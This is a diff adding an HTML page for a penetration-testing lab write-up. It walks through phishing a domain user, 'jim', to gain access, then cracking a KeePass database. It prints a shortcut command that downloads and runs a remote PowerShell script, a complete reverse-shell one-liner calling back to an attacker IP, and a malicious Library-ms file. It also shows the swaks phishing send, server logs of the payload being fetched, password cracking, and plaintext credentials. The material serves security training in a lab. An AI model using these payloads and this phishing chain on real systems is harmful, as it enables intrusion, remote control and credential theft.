@@ -1,0 +1,202 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX14</h1>
+    <h2 class="subtitle">Fishing</h2>
+    <p class="text">We discovered mail address <u>jim@relia.com</u> on the BOX249. Also, the BOX189 has smtp(hMailServer), which can deliver mails inside of AD.</p>
+    <p class="text">Using this functionality, we can send fishing mail against jim.</p>
+    <p class="text">To create fishing mail, we need several components.</p>
+    <p class="text">1. @config.Library-ms</p>
+    <p class="text">2. @body.txt</p>
+    <p class="text">3. Directory to share malicious file.</p>
+    <p class="text">4. Malicious file to execute itself and .lnk file navigating to malicious file.</p>
+    <p class="text">There are several ways to construct malicious file, but the fastest way is to use actual Windows GUI. We have credential <u>offsec / lab</u> to logon to BOX250 with RDP. Let's use it.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/relia/14/1.png' %}" alt="">
+        <p class="text">My favorite RDP client is remmina. Enter WINPREPP(.250) port and login credeintial.</p>
+    </div>
+    
+    <div class="img">
+        <img src="{% static 'EthHack/images/relia/14/2.png' %}" alt="">
+        <p class="text">Then, right click desktop and open shortcut creation tab. Then, enter below code : <br><br><code>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.246/shell.ps1')"</code></p>
+    </div>
+    <p class="text">Then, we successfully created DownloadString shortcut to execute malicious code.</p>
+    <p class="text">Please install it to your machine.</p>
+    <p class="text">Next, we need shell.ps1 which include reverse shell code.</p>
+
+    <div class="code-box"><pre><code>&#36;client = New-Object System.Net.Sockets.TCPClient('192.168.45.246',4444);&#36;stream = &#36;client.GetStream();[byte[]]&#36;bytes = 0..65535|%{0};while((&#36;i = &#36;stream.Read(&#36;bytes, 0, &#36;bytes.Length)) -ne 0){;&#36;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&#36;bytes,0, &#36;i);&#36;sendback = (iex &#36;data 2>&1 | Out-String );&#36;sendback2  = &#36;sendback + 'PS ' + (pwd).Path + '> ';&#36;sendbyte = ([text.encoding]::ASCII).GetBytes(&#36;sendback2);&#36;stream.Write(&#36;sendbyte,0,&#36;sendbyte.Length);&#36;stream.Flush()};&#36;client.Close()</code></pre></div>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14/fishing]
+└─$ ls
+powershell.lnk  shell.ps1</code></pre></div>
+
+<p class="text">Then, we have prepared two files to serve.</p>
+<p class="text">Next we need to prepare config.Library-ms.</p>
+<div class="code-box"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.45.246&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+&lt;/libraryDescription&gt;</code></pre></div>
+
+<p class="text">Finally, Body.txt can be whatever since it's lab environment. The target is bot and not concern the body contents.</p>
+<p class="text">Then we can send mail which include malicious .lnk, and if the target click the .lnk file, shell.ps1 would be executed.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./fishing
+Running without configuration file.
+15:45:00.926 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+15:45:00.928 - INFO    : WsgiDAV/4.3.3 Python/3.13.5 Linux-6.12.13-amd64-x86_64-with-glibc2.41
+15:45:00.928 - INFO    : Lock manager:      LockManager(LockStorageDict)
+15:45:00.928 - INFO    : Property manager:  None</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ sudo swaks -t jim@relia.com --from mark@relia.com --attach @config.Library-ms --server 192.168.212.189 --body @body.txt --header "Subject: Antivirus soft installation" --suppress-data -ap
+Username: maildmz@relia.com
+Password: DPuBT9tGCBrTbR
+=== Trying 192.168.212.189:25...
+=== Connected to 192.168.212.189.
+&lt;-  220 MAIL ESMTP
+ -> EHLO kali
+&lt;-  250-MAIL
+&lt;-  250-SIZE 20480000
+&lt;-  250-AUTH LOGIN
+&lt;-  250 HELP
+ -> AUTH LOGIN
+&lt;-  334 VXNlcm5hbWU6
+ -> bWFpbGRtekByZWxpYS5jb20=
+&lt;-  334 UGFzc3dvcmQ6
+ -> RFB1QlQ5dEdDQnJUYlI=
+&lt;-  235 authenticated.
+ -> MAIL FROM:&lt;mark@relia.com>
+&lt;-  250 OK
+ -> RCPT TO:&lt;jim@relia.com>
+&lt;-  250 OK
+ -> DATA
+&lt;-  354 OK, send.
+ -> 38 lines sent
+&lt;-  250 Queued (8.232 seconds)
+ -> QUIT
+&lt;-  221 goodbye
+=== Connection closed with remote host.</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./fishing
+Running without configuration file.
+15:45:00.926 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+15:45:00.928 - INFO    : WsgiDAV/4.3.3 Python/3.13.5 Linux-6.12.13-amd64-x86_64-with-glibc2.41
+15:45:00.928 - INFO    : Lock manager:      LockManager(LockStorageDict)
+15:45:00.928 - INFO    : Property manager:  None
+15:45:00.928 - INFO    : Domain controller: SimpleDomainController()
+15:45:00.928 - INFO    : Registered DAV providers by route:
+15:45:00.928 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/lib/python3/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+15:45:00.928 - INFO    :   - '/': FilesystemProvider for path '/home/kali/tempo/lab2/14/fishing' (Read-Write) (anonymous)
+15:45:00.928 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+15:45:00.928 - WARNING : Share '/' will allow anonymous write access.
+15:45:00.928 - WARNING : Share '/:dir_browser' will allow anonymous write access.
+15:45:00.947 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.1 Python/3.13.5
+15:45:00.947 - INFO    : Serving on http://0.0.0.0:80 ...
+15:57:07.004 - INFO    : Got OPTIONS '/' request
+15:57:07.004 - INFO    : Got OPTIONS '/' request
+15:57:07.004 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:07] "OPTIONS /" elap=0.000sec -> 200 OK
+15:57:10.268 - INFO    : Got OPTIONS '/' request
+15:57:10.268 - INFO    : Got OPTIONS '/' request
+15:57:10.269 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:10] "OPTIONS /" elap=0.000sec -> 200 OK
+15:57:10.495 - INFO    : Got OPTIONS '/' request
+15:57:10.502 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:10] "PROPFIND /" length=0, depth=0, elap=0.007sec -> 207 Multi-Status
+15:57:10.719 - INFO    : Got OPTIONS '/' request
+15:57:10.720 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:10] "PROPFIND /" length=0, depth=0, elap=0.001sec -> 207 Multi-Status
+15:57:10.944 - INFO    : Got OPTIONS '/' request
+15:57:10.945 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:10] "PROPFIND /" length=0, depth=0, elap=0.002sec -> 207 Multi-Status
+15:57:11.156 - INFO    : Got OPTIONS '/' request
+15:57:11.158 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:11] "PROPFIND /" length=0, depth=1, elap=0.003sec -> 207 Multi-Status
+15:57:11.367 - INFO    : Got OPTIONS '/' request
+15:57:11.368 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:11] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:57:11.577 - INFO    : Got OPTIONS '/' request
+15:57:11.578 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:11] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:57:11.792 - INFO    : Got OPTIONS '/' request
+15:57:11.793 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:11] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:57:12.009 - INFO    : Got OPTIONS '/' request
+15:57:12.010 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:12] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:57:12.235 - INFO    : Got OPTIONS '/' request
+15:57:12.237 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:12] "PROPFIND /" length=0, depth=1, elap=0.002sec -> 207 Multi-Status
+15:57:12.467 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:12] "GET /powershell.lnk" depth=0, elap=0.001sec -> 200 OK
+15:57:13.213 - INFO    : 192.168.212.191 - (anonymous) - [2025-11-20 20:57:13] "GET /shell.ps1" depth=0, elap=0.000sec -> 200 OK</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ nc -lvnp 4444          
+listening on [any] 4444 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.212.191] 64530
+whoami
+relia\jim
+PS C:\Windows\System32\WindowsPowerShell\v1.0> </code></pre></div>
+<p class="text">We got reverse shell.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>PS C:\Users\jim\documents> ls
+
+
+    Directory: C:\Users\jim\documents
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        10/27/2022   1:57 AM           1998 Database.kdbx                                                        </code></pre></div>
+
+<p class="text">There is kdbx file. Let's decode it.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ keepass2john Database.kdbx > database.john
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ john database.john --wordlist=/usr/share/wordlists/rockyou.txt
+Database:mercedes1</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/14/3.png' %}" alt="">
+    <p class="text">There are two credentials. <br><br><u>dmzadmin : SlimGodhoodMope</u><br><u>jim : Castello1!</u></p>
+</div>
+
+<div class="code-box"><pre><code>PS C:\Users\jim\documents> net user
+
+User accounts for \\WK01
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+offsec                   WDAGUtilityAccount       
+The command completed successfully.</code></pre></div>
+
+<p class="text">Since there is no such users, we can conclude they are AD users. Therefore, it's would be possible to enter computers which are member of AD.</p>
+<p class="text">Since the proof flag is owned by offsec user, we don't need to get admin privilege.</p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/14]
+└─$ nxc smb 192.168.212.191 -u jim -p 'Castello1!'
+SMB         192.168.212.191 445    LOGIN            [*] Windows Server 2022 Build 20348 x64 (name:LOGIN) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                         
+SMB         192.168.212.191 445    LOGIN            [+] relia.com\jim:Castello1! </code></pre></div>
+
+<p class="text">We got AD user.</p>
+
+
+</body>
+</html>
